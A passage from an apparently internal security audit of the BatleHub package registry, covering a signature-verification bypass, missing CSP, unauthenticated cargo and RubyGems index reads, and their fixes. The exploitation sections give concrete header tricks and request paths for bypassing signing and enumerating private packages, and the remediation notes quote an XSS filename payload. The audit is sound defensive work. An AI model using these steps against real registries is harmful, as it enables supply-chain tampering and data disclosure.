with the enabling gap at `crates/core/src/services/local_registry/publish.rs:31`
(`check_signing_policy`)
**Category:** signature verification bypass

Two independent optional headers govern artifact signing. `extract_signature_headers`
(`crates/web/src/handlers/proxy/common.rs:67-80`) reads them separately, and neither implies the
other:

```rust
let sig_bytes = req.headers().get("X-Artifact-Signature") … ;
let sig_type  = req.headers().get("X-Signature-Type")     … ;
(sig_bytes, sig_type)
```

**At publish**, `check_signing_policy` requires only the *bytes*, and skips the allow-list
entirely when the type is absent:

```rust
if signing.required && sig_bytes.is_none() {
    return Err(CoreError::AccessDenied(
        "artifact signature required (X-Artifact-Signature header missing)".into(),
    ));
}
if !signing.allowed_types.is_empty() {
    if let Some(st) = sig_type {          // <-- None short-circuits the whole check
        if !signing.allowed_types.iter().any(|t| t == st) { … }
    }
}
```

**At download**, with `verify_on_download` enabled, verification requires *both* and otherwise
returns `Ok`:

```rust
let (Some(sig), Some(ty)) = (sig_bytes, sig_type) else {
    metrics::counter!("batlehub_signature_checks_total", …, "outcome" => "skipped").increment(1);
    return Ok(());
};
```

The function's own comment reasons carefully about the *wrong-type* case and deliberately fails
closed there:

> an artifact carrying a signature we *cannot* verify must fail closed, not be waved through as
> "skipped". (An absent signature is handled above and governed by publish-time
> `signing.required`.)

That reasoning is correct for an absent *signature*. It does not hold for a **present signature
with an absent type**, which is the state the two independent headers make reachable and which no
check rejects. The perverse consequence: **supplying a bogus type is rejected, supplying none is
accepted.** Sending `X-Signature-Type: pgp` yields a hard `IntegrityFailure`; sending nothing at
all yields `Ok` with the artifact served.

### Exploitation

An operator enables the strongest available posture — `signing.required = true`,
`verify_on_download = true`, `trusted_keys` populated — and reasonably believes every served byte
carries a signature verified against a trusted key.

A publisher (any identity with `User` role and publish rights to the registry) uploads a
malicious artifact with:

```http
X-Artifact-Signature: <any base64, e.g. AAAA>
```

and **no** `X-Signature-Type` header. `signing.required` is satisfied because bytes are present;
`allowed_types` is not consulted because the type is `None`; the publish succeeds. Every
subsequent download takes the `else` branch, records `outcome="skipped"`, and serves the artifact
unverified. The signature bytes are never checked against `trusted_keys` at any point in the
artifact's life.

The bypass is observable — the `batlehub_signature_checks_total{outcome="skipped"}` counter
increments — but nothing fails, and an operator who enabled `verify_on_download` has no reason to
be watching a "skipped" counter they believe should be zero.

### Fix

Fail closed on the incoherent state at both ends:

1. In `check_signing_policy`, reject a signature whose type is absent when one is required:
   `if sig_bytes.is_some() && sig_type.is_none()` → `AccessDenied`. Equally, when
   `allowed_types` is non-empty, treat `None` as "not in the list" rather than skipping the
   check.
2. In `verify_download_signature`, split the two `None` cases. An absent *signature* may return
   `Ok` (governed by publish-time `required`, as documented). A *present signature with an absent
   type* must return `IntegrityFailure`, exactly as an unverifiable type already does.

The cleanest structural fix is to make the pair unrepresentable: replace the two independent
`Option`s with a single `Option<Signature { bytes, type }>` in `PublishPolicyRequest` and in the
stored metadata, so "bytes without type" cannot be constructed. Regression test: publish with
signature bytes and no type under `required = true` must be refused; if it is stored anyway,
downloading it under `verify_on_download = true` must not return `200`.

### Why this was not caught by the sweep

It scored 7/10 and was dropped. Two refuters found the neighbouring wrong-type branch — which
*does* fail closed, and is well commented — and read it as evidence the path was considered.
That is a reasonable error: the code demonstrates careful thought about the adjacent case. The
missing case is the one the comment asserts is handled elsewhere, and it is not.

---

## Finding 14 — No CSP on the non-SPA HTML served from the console origin (Medium)

> **Status: FIXED** (2026-08-26, same branch). `protocol_document_csp` sends
> `Content-Security-Policy: default-src 'none'; sandbox` on every response under `/proxy/**`,
> wrapped inside the host-routing middleware so a host-routed registry is covered too. The
> console and `/scalar` are outside the prefix and keep their own policies — asserted from both
> sides, in the middleware's own tests and in `spa_csp.rs`.
> See [Remediation notes](#remediation-notes-finding-14).


**Location:** `crates/web/src/middleware/security_headers.rs` (module-level policy decision)
**Category:** missing security control — amplifier for finding 3

This is not an oversight, and the module documents its reasoning at length. It is recorded here
because the reasoning has a gap that finding 3 walks straight through.

The module states the threat model precisely:

> BatleHub serves three very different things from one origin: the admin SPA (which holds bearer
> tokens in `localStorage`), the JSON API, and artifact bytes that outsiders control … anything
> the browser can be talked into *rendering* from an artifact URL runs with the SPA's origin, and
> therefore its storage.

The chosen mitigation is `X-Content-Type-Options: nosniff`, described as "the important one …
stops the browser second-guessing the declared `Content-Type`, which is what turns an artifact
containing HTML into a document."

**`nosniff` defends only against a mis-*sniffed* type. It does nothing when a handler
legitimately declares `text/html`.** That is exactly what `pypi_simple_package` does
(`crates/web/src/handlers/proxy/pypi/simple.rs:99-101`, `:111-113`), and the document it emits
interpolates publisher-controlled strings without escaping (finding 3). The stated defence and
the actual exposure do not meet.

CSP is deliberately not sent as a header for two stated reasons — `/scalar` loads a CDN bundle
that `script-src 'self'` would break, and `actix_files::Files` is not a `ServiceFactory` and
takes no middleware — so the SPA declares its own policy in a `<meta http-equiv>` tag built by
`ui/build/csp.ts` and narrowed at serve time by `crate::spa`.

Both reasons are sound and both are about *other* routes. Neither argues against a CSP on
`/proxy/**` protocol documents, which are neither the SPA nor `actix_files` nor `/scalar`. The
result is that the one category of response that is both attacker-influenced and rendered as HTML
is the one category with no policy at all.

Compounding it: `ui/src/composables/useAuth.ts` stores the **refresh** token alongside the access
token in `localStorage`, so script execution on this origin yields durable account access rather
than a session-length window.

### Fix

Attach a restrictive CSP to protocol documents specifically, rather than globally — the objection
to a global policy does not apply:

```
Content-Security-Policy: default-src 'none'; sandbox
```

on responses emitted from `/proxy/**` that carry a `text/html` content type. That is compatible
with `/scalar` (different scope), needs no `actix_files` middleware (these are handler
responses), and reduces finding 3 from token theft to defacement of a page nobody styles.

Consider also moving the refresh token out of `localStorage` to an `HttpOnly` cookie, which
removes the highest-value target from any future XSS on this origin. That is a larger change and
belongs in its own RFC.

---

## Finding 15 — Cargo sparse index local branch skips the rule chain (High)

> **Status: FIXED** (2026-08-26) by the findings 4-10 change. `get_index` reads through
> `load_visible_versions_or_not_found`, which now runs the chain; no cargo-specific code was
> touched. Its `authz_matrix` row is `Expect::Denied`.


**Location:** `crates/web/src/handlers/proxy/cargo/index.rs:123` (`serve_local_index`), reached
from `cargo_registry_index` at `:96` (Local) and `:100` (Hybrid)
**Category:** authorization bypass
**Found by:** the authorization matrix, not the sweep

```rust
async fn serve_local_index(…) -> Result<HttpResponse, AppError> {
    let name = crate_name_from_index_path(index_path);
    match local_svc.get_index(registry, name, identity).await {
        Ok(content) => Ok(HttpResponse::Ok()
            .content_type("text/plain; charset=utf-8")
            .body(content)),
```

No `authorize_read`. The sparse index is **the** read path for `cargo build` against a private
registry — it is what the client fetches to resolve every dependency, and it carries every crate
name and version in the registry.

What makes this the sharpest instance of the class: `proxy_upstream_index`, the function directly
below it in the same file, carries this comment —

> This route used to answer with a bare `reqwest` GET forwarded to the client: no rule chain, no
> access event, no metadata cache. Blocked-version filtering is why it moved, but the
> **authorisation** gap was the more serious finding — a private cargo registry's crate names and
> versions were readable by anyone who could reach the port.

That gap was identified, understood, written down, and closed **on the proxy path**. The local
path, twenty lines above, was never given the same treatment. A registry in `local` mode — the
mode a private company registry actually runs in — still has it.

### Exploitation

A cargo registry in local mode with `[registries.rbac] anonymous = []`.
`GET /proxy/{reg}/registry/in/te/internal-auth-lib` returns the crate's full index entry —
versions, checksums, feature sets, dependency graph — to a caller with no credentials. Walking
the shard paths enumerates the registry.

### Fix

Call `svc.authorize_read(&PackageId::new(registry, name, "__index__"), identity, RELEASES_READ)`
at the top of `serve_local_index`, matching what `proxy_upstream_index` does. The matrix row for
`cargo /registry/{path}` flips from `KnownGap` to `Denied` in the same change.

---

## Finding 16 — RubyGems compact index skips the rule chain (Medium)

> **Status: FIXED** (2026-08-26) by the findings 4-10 change, all three routes. `/info/{gem}`
> refuses with `403`; `/versions` and `/names` are assembled package by package, so a denied
> caller gets an **empty** document rather than a refusal — which discloses nothing and is what
> the matrix asserts.


**Locations:** `crates/web/src/handlers/proxy/rubygems/compact.rs:136` (`serve_compact`, serving
`/versions` and `/names`) and `:323` (`gem_compact_info`, serving `/info/{gem}`)
**Category:** information disclosure
**Found by:** the authorization matrix, not the sweep

Both follow the same shape. `serve_compact`:

```rust
let local = if mode == RegistryMode::Local || mode == RegistryMode::Hybrid {
    which.local(local_svc, &registry, &identity.0).await.map_err(AppError::from)?
} else { String::new() };
if mode == RegistryMode::Local {
    return Ok(text_body(http_req, local));       // <- returns here, no chain
}
// proxy/hybrid path below builds a ProxyRequest with RELEASES_READ and calls
// multi_package_document, which does run the chain
```

The compact index is what Bundler reads first, so this is the primary read path for the
ecosystem: `/versions` is every gem and every version in the registry, `/names` is every gem
name, `/info/{gem}` is one gem's full version list with checksums.

`/names` is documented as deliberately unfiltered for **blocking** — "a gem with one blocked
version still exists" — and that reasoning is sound. It is a different question from whether a
caller the registry's RBAC denies may read it at all, and the second question was never asked.

Detecting this needed the matrix's version-string signal: `/info/{gem}` and `/versions` are keyed
by the URL and their bodies are bare version lists, so they disclose a gem without ever naming
it. A name-only disclosure check reports them clean.

### Fix

Run the chain before the local branch returns, in both functions — `RELEASES_READ` against the
same synthetic coordinate the proxy path already uses (`which.coordinate()` / the gem name with
`__compact__`). Three matrix rows flip in the same change.

---

## Refuted candidates

Recorded so the same ground is not re-walked. Each was raised by a surface auditor and killed by
at least one of the three refuters; the score is the lowest confidence any lens assigned.

| Candidate | Score | Why it was dropped |
| --- | --- | --- |
| Filesystem storage-key `.`-segment aliasing (`storage/filesystem.rs:125`) | 2/10 | No concrete authorization consequence; `ensure_safe_key` holds |
| Filesystem `:` → `__` non-injective encoding (`storage/filesystem.rs:127`) | 7/10 | Collision requires operator-invalid names |
| Explore registries stats on empty accessible set (`db/packages/explore.rs:448`) | 7/10 | `explore/list.rs` carries the guard that finding 2 lacks |
| Cargo owners *listing* endpoint unauthenticated (`cargo/ownership.rs:37`) | 7/10 | Read-only; the same names are exposed by finding 11 anyway |
| Composer `dist.url` fetched without SSRF guard (`registry/composer/impl_registry.rs:162`) | 7/10 | The guard is applied upstream of the cited call |
| Per-artifact SBOM ignores per-registry RBAC (`back_office/sbom.rs:61`) | 4/10 | Requires authentication; impact judged below the bar |
| GitHub-Actions OIDC claim rules match unanchored (`auth/actions_oidc/rules.rs:47`) | 3/10 | Patterns are anchored on the path actually checked |
| Publish-time signature allow-list skipped when header omitted (`local_registry/publish.rs:31`) | 3/10 | **Re-raised — this is the enabling half of finding 13** |
| Explore cache key omits the viewer's authenticated bit (`services/explore_cache.rs:201`) | 3/10 | The key does incorporate the identity discriminator |
| Cargo `dl_path` concat allows `@`-host takeover (`registry/cargo.rs:206`) | 2/10 | The value is not attacker-reachable as described |
| Helm chart ships a static default admin token (`helm/batlehub/values.yaml:215`) | 2/10 | Placeholder, not a functioning credential |

**Two candidates were re-raised after manual review and promoted to findings 13 and 14.** The
Ed25519 entry (`read.rs:314`) and its publish-side half (`publish.rs:31`) were both dropped by the
automated pass; reading the code directly showed the bypass is real, and they are one finding, not
two. This is a useful calibration datum: the refuters were shown *one* location at a time, and
each half looks defensible in isolation — the publish check "only" skips an allow-list, the
download check "only" skips a signature the publish side is said to require. The defect exists
solely in the join. A per-finding verifier structurally cannot see that; only a reviewer holding
both ends can.

Finding 14 was never a candidate at all — it surfaced from the completeness critic's gap list as
context for finding 3, and became a finding once the `security_headers.rs` reasoning was read
against the PyPI handler's actual `content_type`.

---

## Surfaces that came back clean

Recorded because a clean result is evidence, and because re-auditing them has low expected value:

- **Signed URLs (RFC 0012).** The HMAC construction is sound: `canonical()` is injective
  (netstring `<byte-len>:<value>` framing with an explicit presence marker for the optional
  subject and a count prefix on the group list), the MAC covers the request's coordinate rather
  than the payload's copy, `Mac::verify_slice` is a constant-time compare, expiry and role are
  inside the MAC, and per-registry subkey derivation prevents cross-registry reuse. Redemption
  re-authorizes, so a signed URL cannot outrun a block applied after minting.
- **SQL.** No injection found. Queries use `.bind()` / `push_bind()` throughout; the faceted
  search and explore paths, the usual offenders, are parameterised. The 38 migrations and the
  full-text-search `to_tsquery` usage are clean.
- **README rendering.** The ammonia allow-list, SVG re-serialisation, chip escaping and
  sandboxed-image CSP resisted every bypass attempted, including the normalise-after-filter shape
  that produced a real bypass previously.
- **SSRF.** The guard in `registry/ssrf.rs` held against host- and scheme-replacement attempts,
  including the `Url::join`-with-absolute-URL case.
- **Middleware.** `proxy_trust` correctly requires the peer to be in `trusted_proxies` before
  honouring `X-Forwarded-For`; `host_routing` rewrites before authorization is computed.

---

## Coverage gaps

Every finding above was verified on all three lenses; no candidate was lost to an incomplete
run. What follows is what the fourteen surfaces did **not** cover, and how likely each gap is to
hide something.

### Likely to hide a High or Medium issue

- **`/scalar`'s unpinned CDN bundle.** `crates/web/src/lib.rs:1069` serves `utoipa_scalar`, which
  loads its script from a third-party CDN with no SRI and no version pin, on the console origin —
  an independent path to the same outcome as finding 3, owned by a third party rather than by a
  publisher. (The CSP half of this gap is now finding 14.)

  > **Status: FIXED** (2026-08-27), and the CDN is gone rather than pinned.
  >
  > Rendering the page in Chrome against a running server found the gap was wider than the
  > script tag: it reached **three** third-party origins, not one. `fonts.scalar.com` for
  > fourteen `.woff2` files — which SRI cannot cover, since `@font-face` has no integrity
  > mechanism — and `api.scalar.com/vector/registry/{curated,search}` fetched on every load, so
  > opening a private registry's docs announced it to a third party. `proxy.scalar.com` is a
  > fourth, reached when "Test Request" fires, carrying whatever token was pasted into the
  > explorer.
  >
  > The bundle is now **self-hosted**: `@scalar/api-reference` is a `ui/` devDependency,
  > `ui/build/copy-scalar.mjs` copies `dist/browser/standalone.js` into the console's build
  > output, and `/scalar` loads `/assets/scalar/standalone.js`. `script-src` is plain `'self'`
  > and the SRI hash is gone with the cross-origin fetch that needed it. The two configurable
  > origins are turned off at source (`withDefaultFonts: false`, `proxyUrl: ""`); the
  > `api.scalar.com` URLs are hardcoded and ignore `apiBaseUrl` (tried), so `connect-src 'self'`
  > in the new `API_DOCS_CSP` is what stops them.
  >
  > **Verified in a browser both ways:** with the console built, the page renders identically to
  > the CDN version (2 204 elements, four stylesheets, screenshot compared) and issues **zero**
  > outbound requests — the only network activity is same-origin. Without `static_dir`, `/scalar`
  > serves an honest degraded page naming what is missing and how to fix it, with the spec still
  > embedded so `curl` yields it; it does not fall back to the CDN, which would reinstate the
  > problem exactly where it is least wanted. `pnpm audit --audit-level high` is clean with the
  > ~194 added packages, and both Containerfiles already run `pnpm run build` and copy `dist`, so
  > the bundle ships with no change to them.
  >
  > Thirteen tests; the three stale comments naming `/scalar` as the reason no CSP could exist
  > were corrected, as was `docs/guide/admin-config.md`.
  >
  > **Worth knowing:** the bundle's supply chain (25 direct, ~190 transitive) is now *declared*
  > rather than invisible. That is the point — the browser always executed it — but it does mean
  > an advisory in any of them can now fail CI, where before it would have failed silently in
  > your operators' browsers.

- **SBOM archive extractors** (`crates/adapters/src/sbom/extractor/*.rs`). Publisher-controlled
  tar/gz/zip decoded with no size ceiling in four of six extractors — only `conda.rs` has a
  `take` (l.75-85); `cargo.rs`, `npm.rs`, `pypi.rs`, `maven.rs` have none. Out of scope here as
  resource exhaustion, but the same code paths deserve a traversal review that this sweep did not
  perform.

  > **Reviewed 2026-08-27. No traversal surface** — nothing here unpacks. There is no `unpack()`,
  > no `File::create`, no write of any kind: entries are matched by name and read into a `String`.
  > The size-ceiling gap stands as described and stays out of scope.
  >
  > The review found a different defect in the same code, now **FIXED**. Every extractor answered
  > "which entry is the manifest?" with a suffix test and took the **first** entry that passed —
  > `ends_with("pom.xml")`, `ends_with(".nuspec")`, a bare `Cargo.toml`/`PKG-INFO` at any depth —
  > and archive order belongs to whoever built the archive. Verified against the pre-fix code: a
  > `.crate` holding `aaa/vendor/Cargo.toml` (`MIT`) ahead of `evil-1.0.0/Cargo.toml`
  > (`GPL-3.0-only`) reported MIT, and a jar holding `a/decoypom.xml` reported the decoy —
  > `ends_with` matched a file not even named `pom.xml`. `npm.rs` was the only one that
  > constrained position, and its depth check was not enough on its own: `aaa/package.json` sits
  > at the same depth and still won on order.
  >
  > That read produces the licence `LicenseGateRule` evaluates and the `license`/dependency fields
  > of the SBOM attested on release. It is **not** a gate on bytes — a publisher authors the real
  > manifest anyway, so a decoy grants no licence they could not simply declare. What it grants is
  > *disagreement*: the gate and the attested SBOM say one thing while `cargo metadata`, Maven,
  > `pip` and any auditor reading the same archive say another. `cve_gate` is unaffected — it
  > reads `VulnerabilityRepository::list_for_coordinate`, not the extracted dependency list.
  >
  > Fixed structurally, in a new `sbom/extractor/anchor.rs`: match the manifest's **canonical
  > location**, and require **exactly one** match. Anchoring alone does not close it — a `.crate`
  > may hold two `{dir}/Cargo.toml`, a `.nupkg` two root `.nuspec`, a wheel two
  > `*.dist-info/METADATA` — so requiring a sole match is what removes the *choice*: a planted
  > second manifest now yields "unknown", never an answer of the attacker's picking. "Unknown" is
  > the state `license_gate` is built around and `allow_unknown` defaults to `true`, so the
  > default posture is unchanged. All five extractors were converted, npm included. Fourteen
  > regression tests; every decoy test was confirmed to fail against the pre-fix semantics.
  >
  > **Behaviour change worth knowing:** an uber/shaded jar carries one canonical pom per bundled
  > dependency and nothing says which is its own, so it now reports unknown. Previously it
  > reported whichever came first — in practice some *dependency's* licence, presented as the
  > artifact's. Where `sbom.required = true`, such a jar's publish is refused rather than recorded
  > against the wrong manifest.
- **`crates/adapters/src/registry/fanout.rs`.** `list_versions` and `search_packages` return the
  first non-empty upstream result with no origin or priority guard, so a lower-priority upstream
  can shadow a name the primary registry owns — dependency confusion, sitting under exactly the
  `hybrid` registries where local packages also live.
- **`crates/core/src/services/version_order.rs`.** `DenyLatestRule` and `ReleaseAgeGateRule` are
  supply-chain controls that reduce to a version comparison. A prerelease or build-metadata
  mis-ordering is a silent bypass of a control the operator believes is enabled.
- **`crates/core/src/services/quota.rs`** — 771 lines of accounting reachable from every publish,
  ending in a per-tenant enforcement decision. Large surface, zero coverage.

### Unlikely to hide a High or Medium issue

Checked and reasoned about, not merely skipped:

- **Eviction.** Local artifacts key as `local:{reg}/…` (`local_registry/mod.rs:252`) while the
  coherence sweep lists only `artifact:{reg}/` (`eviction/mod.rs:270-275`), and deletion requires
  two consecutive orphan observations plus a fresh point lookup. Worst case is cache loss.
- **`/metrics` cardinality.** The `registry` label comes from `match_info().unprocessed()` and the
  middleware bails when it does not resolve, so the unbounded-label case is already closed.
  Residual risk is disclosure of configured registry names to unauthenticated scrapers.
- **Rate-limit key concatenation.** A `user_id` containing `:` can only collide into another
  bucket — self-throttling. No key shape yields a *higher* limit.
- **`readme_image.rs`.** Redirects disabled, per-hop guard, credentials stripped, loopback refusal
  tested against a live listener.
- **`healthz` / `error.rs` / `inbound_webhook`.** Version disclosure, prose in error bodies,
  unsigned-webhook row writes — all low individually.
- **CI and containers.** `.github/` and `.forgejo/` workflows have no `pull_request_target`, no
  `${{ github.event.* }}` interpolation, and every workflow declares `permissions:`. Both
  Containerfiles are distroless/UBI, digest-pinned, `USER 65532`. Unassigned but verified clean.

### Not reviewed at all

`crates/adapters/src/{cache,rate_limit,notification}/**` key construction,
`crates/core/src/services/{cache_control,stats_rollup,integrity}.rs`,
`crates/adapters/src/in_memory/**` (production-reachable when no DB is configured, yet treated as
test-only), the migrations' constraints and uniqueness guarantees backing the authz model,
`helm/batlehub/templates/**` beyond `values.yaml`, and `ui/` beyond the three real HTML sinks
(`RichText.vue`, `CodeBlock.vue` l.20, `ReadmePanel.vue`).

---

## Highest-value follow-up

> **Built, 2026-08-26.** See [authorization-matrix.md](./authorization-matrix.md). One result is
> worth recording here because it changes how this class should be hunted in future: the first
> implementation was **static** — index the handlers, walk the call graph, record which
> authorization primitives each route reaches — and it **failed calibration, missing six of the
> eight known findings.** A handler with a guarded proxy branch and an unguarded local branch
> mentions `authorize_read` either way, so the static question answers "yes" for exactly the
> routes that are broken. The property is per-path, not per-function. The matrix is behavioural
> for that reason, and a static version would have been worse than none.


**Build an exhaustive route-by-route authorization matrix over every route registered in
`crates/web/src/lib.rs`, asserting for each: (a) visibility enforcement, (b) the
`[registries.rbac]` rule chain, (c) the unlisted/yanked filter.**

Ten of the thirteen findings are the same defect, discovered one registry at a time because the
sweep sliced its surfaces by handler family. That slicing is *why* maven, nuget, terraform
(twice), conda, goproxy, jetbrains and pypi each yielded a separate hit: the check is applied by
convention, not by construction. The ecosystems that no finding names — deb/rpm/pacman, generic,
vsx/openvsx, rubygems, the forgejo/github/gitlab clients — are far more likely to be
*unexamined* than *correct*.

A matrix built by enumerating `collect_routes` and diffing each handler against a reference
handler that does it right converts an open-ended hunt into a finite checklist — and the same
table becomes the regression gate that stops the class from recurring. It has already recurred
once, on OpenVSX.

Runner-up, and cheap: **decide whether CSP is a header or a `<meta>` tag.** Today it is a meta tag
on exactly one document, which is precisely what makes finding 3 worth a refresh token.

---

## Remediation notes (finding 1)

The claim rule chosen was **publish-only**: the owners API edits an existing owner list and can
never establish one. Ownership originates in exactly one place, `register_initial_owner`, from
the authenticated publisher's identity on a package's first publish.

What changed, in `crates/web/src/handlers/proxy/cargo/ownership.rs`:

- `require_owner` → `require_owner_mutation`. It no longer delegates the unowned case to
  `can_publish`. It requires `has_role_at_least(&Role::User)` **and** `user_id.is_some()`
  (`401` otherwise), then refuses outright when the owner list is empty (`403`). Only for an
  already-owned crate does it consult `can_publish`, where that predicate correctly reduces to
  "is an owner, directly or through a group".
- `cargo_add_owners` and `cargo_remove_owners` both gained `require_local_mode`; the route
  previously answered on proxy-mode registries, which have no ownership to change.
- `utoipa` annotations updated for the new `401`; `ui/openapi.json` regenerated.

**Consequence to be aware of:** a crate published anonymously, or published before ownership
existed, has no owners and can no longer be claimed through the cargo CLI at all. That is the
point — it was the takeover primitive — but it means the recovery path is now
`POST /api/v1/admin/registries/{registry}/packages/{name}/owners`, which is `require_admin`-gated
(`crates/web/src/handlers/back_office/governance/ownership.rs:180`). Operators with legitimately
unowned crates need to know that.

**Still outstanding from this finding's neighbourhood:**

- **Audit existing data before considering it closed.** The route was open; planted owner rows may
  already exist and are unaffected by the fix. They look like `granted_by IS NULL` on a package
  with no published versions, or an owner whose `principal_id` never appears in that registry's
  publish history.
- **`cargo_owners` (GET, `:36`) was deliberately left alone.** It takes no identity parameter and
  so cannot authorize; a private crate's owner list is world-readable. This was raised by the
  sweep, scored 7/10, and is out of scope of the change that was approved. It is a small fix
  whenever it is wanted.
- The sibling admin API at `back_office/governance/ownership.rs` gates correctly on
  `require_admin` and was not modified.

---

## Remediation notes (finding 2)

The guard was chosen over the structural port change, because the codebase had already weighed
that trade and written the answer down. `explore/list.rs` guards in the handler explicitly
*"rather than by teaching four repositories to tell 'all' from 'none' apart"* — so the consistent
fix here is the same guard, not a second opinion about the port.

What changed:

- `front_office/packages.rs` — the existing early return, which covered only "a named registry the
  caller cannot access", now also covers `accessible.is_empty()`. Same `denied_everywhere` /
  `named_registry_denied` shape as the sibling endpoint, so the two read alike.
- `crates/core/src/entities/package.rs` — `PackageFilter::registries` now documents that empty
  means *all* and never *none*, names both implementations that read it that way, and states the
  obligation on any caller deriving the list from permissions. The trap was discoverable only by
  reading the Postgres adapter and the in-memory repository and noticing they agree.
- `crates/web/tests/common/mod.rs` — `make_app_with_defaults_and_access` allows a suite to
  substitute the `AccessConfig`, which is what makes "a caller entitled to nothing" expressible.
  It was not, before; that is a large part of why this shipped.

**Deliberately not changed:** `PackageFilter.registries` is still `Vec<String>` rather than
`Option<Vec<String>>`. The overload is load-bearing — `packages.rs` passes `vec![]` to mean "no
list restriction" once `query.registry` has been validated — so disambiguating the type is a real
improvement but touches four repository implementations and every construction site. It belongs
in its own change, and the guards plus the doc comment close the vulnerability without it.

**Checked and not affected:** `back_office/packages/list.rs` passes `registries: vec![]`
unconditionally, but it is `require_admin`-gated and listing everything is its purpose.

---

## Remediation notes (finding 3)

Both halves were fixed, and in that order: escape at the sink, then validate at the edge. The
edge check alone would have left every already-published hostile filename live; the escape alone
would have left the value in the database for the next thing that renders it.

What changed:

- **`crates/core/src/services/escaping.rs`** (new) — `escape_html` / `push_escaped_html` (`&`,
  `<`, `>`, `"`, `'`) and `percent_encode_path_segment` (RFC 3986 unreserved set kept, everything
  else encoded, so `/`, `?`, `#`, `%` and `+` cannot leave the segment). The survey's own note
  that `grep -rn 'html_escape|escape_html'` returned nothing across `crates/` was the finding
  underneath the finding: there was no shared answer, so each site improvised. There is one now,
  and it lives in `core::services` rather than in `readme::render` so the Simple index does not
  have to depend on the README renderer to be safe.
- **`eco_pypi.rs`** — `filename`, `sha256`, `base` and `package_name` are all escaped;
  `filename` and `sha256` are percent-encoded first, since they land in a path segment and a
  fragment where entity-escaping alone would not stop a `#` or a `/`. The doc comment now says
  why each of the four is untrusted.
- **`readme/render.rs`** — `preformatted` and `chip` had two private, identical escape
  implementations; both now call the shared helper. `chip`'s reason for escaping `'` (the
  `decode_basic_entities` round-trip) was moved into the doc comment so it survives the dedupe.
- **`crates/web/src/handlers/proxy/pypi/mod.rs`** — new `validate_distribution_filename`:
  `[A-Za-z0-9._+-]` only, no leading `.` or `..`, ≤ 256 chars, and `parse_pypi_filename` must
  agree it names a distribution. The character-set rule is the load-bearing one — the XSS payload
  `<img src=x onerror=…>-1.0.0.tar.gz` *parses* fine, which is asserted in the test so nobody
  later concludes the parse was sufficient.
- **`pypi/publish.rs`** — calls it on the filename, including the synthesised
  `{name}-{version}.tar.gz` fallback: `name` is only checked for path-safety, so the fallback is
  as capable of carrying markup as the uploaded value is. `400`, and the `utoipa` block now
  declares it.

**Deliberately not done here:** the `Content-Security-Policy` on `text/html` served from
`/proxy/…` that this finding's fix section suggests. That is finding 14, it is a middleware
change affecting every protocol document, and it belongs in its own diff — it caps the blast
radius of this class rather than closing this instance.

**Not changed, and worth knowing:** `validate_distribution_filename` does not require the
filename's own name/version to *match* the `name` and `version` form fields, which real PyPI
does enforce. A publisher can still upload `other-1.0.0.tar.gz` under the coordinate
`mypkg 1.0.0`. That is a metadata-consistency defect, not an injection one — the value is inert
now either way — but it is the obvious next tightening if this route is revisited.

**Existing data:** the escape makes any already-stored hostile filename harmless on render, but
it is still stored. A registry that ran in local or hybrid PyPI mode before this fix is worth a
look for `index_metadata->>'filename'` values that `validate_distribution_filename` would now
reject.

---

## Remediation notes (findings 4 to 10)

The survey argued for the structural fix over eight local ones — *"give
`get_artifact` the resource type and have it run the chain itself, so the safe
path is the only path"* — and that is what was done. Adding eight calls would
have closed eight holes and left the ninth registry adapter to rediscover the
rule.

**Where the chain lives now.** `crates/core/src/services/registry_authz.rs` holds
`authorize_read` (the full chain) and `authorize_listing` (the identity-keyed
`rbac` rule only), as free functions over the `HotConfigLock` both services
share. `ProxyService`'s two methods delegate to them, so there is exactly one
implementation of each. The reason it is not a `ProxyService` method any more is
the whole finding: the chain was on the *proxy* side of a fork that every
download handler makes, and the local side had to remember to reach across.

**Two funnels, one gate each.**

| Funnel | Runs | Covers |
| --- | --- | --- |
| `load_visible_versions` → new `check_read_access` | `authorize_listing` + `check_visibility` | every local **document**: cargo sparse index, npm packument, pypi simple, terraform listings, rubygems compact index, jetbrains listings, composer, maven metadata, nuget flat index |
| `get_artifact` / `get_artifact_at_key` → new `authorize_artifact_read` | `authorize_read` + `check_visibility` + `check_prerelease_access` | every local **artifact** |

`get_artifact` gained a `resource_type` parameter — not a constant — so each call
site has to name what it serves. The compiler enumerated the sites, which is how
the goproxy `.zip` came out as `source:read` (matching its own proxy
fall-through) while `.info` and `.mod` stayed `releases:read`.

**Listings get RBAC only, downloads get the whole chain.** This is deliberate and
matches what the proxy path already does. `authorize_listing`'s doc comment
explains it: every rule but `rbac` judges a concrete version, and a listing names
none, so a licence or release-age gate handed a listing does not gate it — it
blanks it, turning "one version is gated" into "`npm install` of anything from
this registry fails". The chain still runs in full on the download that follows.

**The three direct-storage readers.** Maven's multi-file artifacts, the NuGet flat
`.nupkg`/`.nuspec` and the Terraform provider binary computed their own storage
key and read `local_svc.storage` themselves, which is how they skipped
`check_visibility` (findings 6 and 7). They now call `get_artifact_at_key`, which
takes the key and applies the same gate. It returns `Ok(None)` for an absent key
so hybrid can still fall through — but only a `CoreError::Storage` fault falls
through now, never an `AccessDenied`: a refusal is an answer, and falling through
would ask the upstream for a package the caller was just refused.

**The fixture bug underneath the finding.** `crates/web/tests/common/mod.rs` built
the `LocalRegistryService` with its **own, empty** `HotConfig`, while
`server/src/main.rs` clones one `Arc` into both services. So no test in the suite
could observe a local read being authorised at all — the policy the test set and
the policy the local path read were different objects. That is a large part of
why eight handlers shipped unguarded, and `explore.rs` carried a comment working
around it. `make_local_svc` now takes the lock as a parameter, so every
construction site passes the proxy's.

**Also closed by the same change, and named here so the fix is not credited
twice:**

- **Finding 15** (cargo sparse index) and **finding 16** (rubygems `/info`,
  `/versions`, `/names`) — both are `load_visible_versions` callers.
- `terraform /v1/modules/…/versions`, `jetbrains /plugins/list`,
  `jetbrains updatePlugins.xml` — matrix rows that were failing as `Denied`; the
  whole-registry ones answer `200` with an **empty** document rather than `403`,
  because they are built by asking each package in turn and a denied caller is
  denied every one. An empty index discloses nothing, which is the property the
  matrix measures.
- `composer /packages.json` needed its own one-line gate: it took the identity
  and dropped it (`_identity`), and its `available-packages` array names every
  package in the registry. That is finding 11's *shape* on a non-search route, so
  it is fixed here rather than left to that finding's change.

**Two behavioural consequences an operator will notice.**

- **The chain judges the version's real metadata, not a synthetic coordinate.**
  Moving the chain into the local read funnel made it the gate for *every*
  ecosystem's download rather than the six routes that used
  `serve_local_or_proxy_artifact` — and `synthetic_metadata` reports
  `published_at`, `is_signed` and `checksum` as `None`, which
  `require_signed_release` with `deny_missing_signature` and `release_age` with
  `deny_missing_timestamp` both read as *refuse*. A registry with either gate on
